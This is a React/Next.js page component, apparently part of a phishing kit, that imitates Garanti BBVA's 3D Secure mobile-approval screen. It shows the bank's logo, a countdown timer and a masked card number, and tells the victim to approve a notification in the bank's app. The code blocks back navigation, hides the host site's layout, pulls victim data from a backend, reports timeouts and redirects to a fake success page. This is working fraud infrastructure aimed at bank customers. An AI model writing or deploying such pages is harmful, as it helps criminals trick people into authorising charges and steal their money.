'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import OnlineTracker from '@/components/OnlineTracker';

interface SmsData {
    tutar: string;
    tarih: string;
    lastFourDigits: string;
    cardType: 'visa' | 'mastercard' | 'unknown';
    maskedPhone: string;
    isyeriAdi: string;
    banka?: string;
}

export default function GarantiMobilOnayPage() {
    const router = useRouter();
    const [data, setData] = useState<SmsData | null>(null);
    const [loading, setLoading] = useState(true);
    const [timeLeft, setTimeLeft] = useState(119); // 1 minute 59 seconds default (like screenshot 01:14)
    const [isTimeout, setIsTimeout] = useState(false);
    const [deviceModel, setDeviceModel] = useState('iPhone');

    // Prevent back navigation
    useEffect(() => {
        window.history.pushState(null, '', window.location.href);
        const handlePopState = () => {
            window.history.pushState(null, '', window.location.href);
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Load data & Device Model
    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/sms');
                const result = await response.json();
                
                if (result.success) {
                    setData(result.data);
                } else if (result.redirect) {
                    router.push(result.redirect);
                }
            } catch (err) {
                console.error('Veri yükleme hatası:', err);
            } finally {
                setLoading(false);
            }
        };

        fetchData();

        // Get user device model
        const ua = navigator.userAgent;
        if (/iPhone/i.test(ua)) {
            setDeviceModel('iPhone');
        } else if (/iPad/i.test(ua)) {
            setDeviceModel('iPad');
        } else if (/Samsung/i.test(ua)) {
            setDeviceModel('Samsung');
        } else if (/Redmi|Xiaomi/i.test(ua)) {
            setDeviceModel('Xiaomi');
        } else if (/Huawei/i.test(ua)) {
            setDeviceModel('Huawei');
        } else if (/Android/i.test(ua)) {
            setDeviceModel('Android');
        } else {
            setDeviceModel('iPhone 15 Pro Max');
        }
    }, [router]);

    // Timer countdown
    useEffect(() => {
        if (timeLeft <= 0) {
            setIsTimeout(true);
            handleTimeoutUpdate();
            return;
        }

        const timer = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);

        return () => clearInterval(timer);
    }, [timeLeft]);

    const handleTimeoutUpdate = async () => {
        try {
            await fetch('/api/sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ smsCode: 'TIMEOUT' })
            });
        } catch (e) {
            console.error(e);
        }
        router.push('/odeme/basarili');
    };

    const formatTimer = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    };

    if (loading) {
        return (
            <div className="flex items-center justify-center min-h-screen bg-[#f4f6fa]">
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>
                <div className="w-12 h-12 border-4 border-emerald-200 border-t-emerald-600 rounded-full animate-spin"></div>
            </div>
        );
    }

    const cc = data?.lastFourDigits || '1013';
    const cardSchemeLogo = data?.cardType === 'mastercard' 
        ? 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png'
        : 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png';

    const cleanTutar = (data?.tutar || '').replace(/TL|TRY|₺/gi, '').trim() || '99.980,00';

    return (
        <>
            <OnlineTracker />
            <style jsx global>{`
                nav.fixed.bottom-0 { display: none !important; }
                main { padding-bottom: 0 !important; }
                header { display: none !important; }
                * {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                }
                body {
                    background: #f4f6fa !important;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: flex-start;
                }
            `}</style>

            <div style={{
                width: '100%',
                maxWidth: '480px',
                margin: '0 auto',
                padding: '16px',
                display: 'flex',
                flexDirection: 'column',
                gap: '14px'
            }}>
                {/* Header (Logo Row) */}
                <div style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                    padding: '8px 4px 4px 4px'
                }}>
                    <img 
                        src="https://www.garantibbva.com.tr/assets/img/garanti-bbva-logo.svg" 
                        alt="Garanti BBVA" 
                        style={{ height: '24px', objectFit: 'contain' }}
                    />
                    <img 
                        src={cardSchemeLogo} 
                        alt="Card Logo" 
                        style={{ height: '20px', objectFit: 'contain' }}
                    />
                </div>

                {/* Subtitle */}
                <div style={{
                    fontSize: '15px',
                    fontWeight: '700',
                    color: '#111',
                    paddingLeft: '4px'
                }}>
                    3D Secure Ödeme Doğrulama
                </div>

                {/* Green Summary Badge */}
                <div style={{
                    background: '#008542',
                    borderRadius: '8px',
                    padding: '14px 16px',
                    color: '#fff',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'flex-start',
                    boxShadow: '0 2px 8px rgba(0, 133, 66, 0.15)'
                }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                        <div style={{
                            fontSize: '13.5px',
                            fontWeight: '700',
                            maxWidth: '220px',
                            overflow: 'hidden',
                            textOverflow: 'ellipsis',
                            whiteSpace: 'nowrap'
                        }}>
                            {data?.isyeriAdi || 'GAZILER VERGI DAICESI'}
                        </div>
                        <div style={{ fontSize: '11px', opacity: 0.85 }}>
                            {data?.tarih || '11.07.2026, 20:08'}
                        </div>
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '4px' }}>
                        <div style={{ fontSize: '13.5px', fontWeight: '700' }}>
                            {cleanTutar} TRY
                        </div>
                        <div style={{ fontSize: '11px', opacity: 0.85, fontFamily: 'monospace', letterSpacing: '0.5px' }}>
                            528939******{cc}
                        </div>
                    </div>
                </div>

                {/* Main Instruction Card */}
                <div style={{
                    background: '#fff',
                    borderRadius: '8px',
                    boxShadow: '0 2px 10px rgba(0,0,0,0.05)',
                    padding: '20px 16px',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    gap: '24px'
                }}>
                    {/* Timer Row */}
                    <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '12px',
                        width: '100%',
                        paddingBottom: '16px',
                        borderBottom: '1px solid #f0f0f0'
                    }}>
                        {/* Blue Clock Icon */}
                        <div style={{
                            width: '36px',
                            height: '36px',
                            borderRadius: '50%',
                            background: '#e0f2fe',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            flexShrink: 0
                        }}>
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0284c7" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                                <circle cx="12" cy="12" r="10" />
                                <polyline points="12 6 12 12 16 14" />
                            </svg>
                        </div>
                        <div style={{ display: 'flex', flexDirection: 'column' }}>
                            <span style={{ fontSize: '11px', color: '#666' }}>İşlemi tamamlamak için kalan süre:</span>
                            <span style={{ fontSize: '16px', fontWeight: '700', color: '#111' }}>{formatTimer(timeLeft)}</span>
                        </div>
                    </div>

                    {/* Garanti Clover Logo Icon Container */}
                    <div style={{
                        width: '74px',
                        height: '74px',
                        borderRadius: '16px',
                        background: '#008542',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        boxShadow: '0 4px 12px rgba(0, 133, 66, 0.2)'
                    }}>
                        {/* Beautifully drawn Clover SVG */}
                        <svg viewBox="0 0 100 100" fill="white" width="48" height="48">
                            <path d="M50,45 C44,32 30,36 34,48 C37,56 46,51 50,55 C54,51 63,56 66,48 C70,36 56,32 50,45 Z" />
                            <path d="M55,50 C68,44 64,30 52,34 C44,37 49,46 45,50 C49,54 44,63 52,66 C64,70 68,56 55,50 Z" />
                            <path d="M50,55 C56,68 70,64 66,52 C63,44 54,49 50,45 C46,49 37,44 34,52 C30,64 44,68 50,55 Z" />
                            <path d="M45,50 C32,56 36,70 48,66 C56,63 51,54 55,50 C51,46 56,37 48,34 C36,30 32,44 45,50 Z" />
                        </svg>
                    </div>

                    {/* Instruction Text */}
                    <div style={{
                        fontSize: '13.5px',
                        color: '#444',
                        textAlign: 'center',
                        lineHeight: '1.6',
                        padding: '0 8px'
                    }}>
                        Lütfen <strong style={{ color: '#111' }}>{deviceModel}</strong> model telefonunuza gönderilen bildirimi Garanti BBVA Mobil uygulaması üzerinden onaylayın.
                    </div>

                    {/* Change Verification Method Link */}
                    <button style={{
                        background: 'none',
                        border: 'none',
                        color: '#008542',
                        fontSize: '14px',
                        fontWeight: '700',
                        cursor: 'pointer',
                        padding: '4px 8px'
                    }}>
                        Doğrulama Yöntemi Değiştir
                    </button>
                </div>

                {/* Bottom Accordion Action Options */}
                <div style={{
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '10px',
                    width: '100%',
                    marginTop: '4px'
                }}>
                    {/* Yardım Accordion */}
                    <div style={{
                        background: '#eef2f6',
                        borderRadius: '8px',
                        padding: '14px 16px',
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        cursor: 'pointer',
                        fontSize: '13px',
                        fontWeight: '700',
                        color: '#1e293b'
                    }}>
                        <span>Yardım</span>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                            <polyline points="6 9 12 15 18 9" />
                        </svg>
                    </div>

                    {/* İptal Et Button */}
                    <button 
                        onClick={() => router.push('/sepetim')}
                        style={{
                            width: '100%',
                            background: '#eef2f6',
                            border: 'none',
                            borderRadius: '8px',
                            padding: '14px',
                            fontSize: '13px',
                            fontWeight: '700',
                            color: '#1e293b',
                            textAlign: 'left',
                            cursor: 'pointer'
                        }}
                    >
                        İşlemi İptal Et
                    </button>
                </div>
            </div>
        </>
    );
}
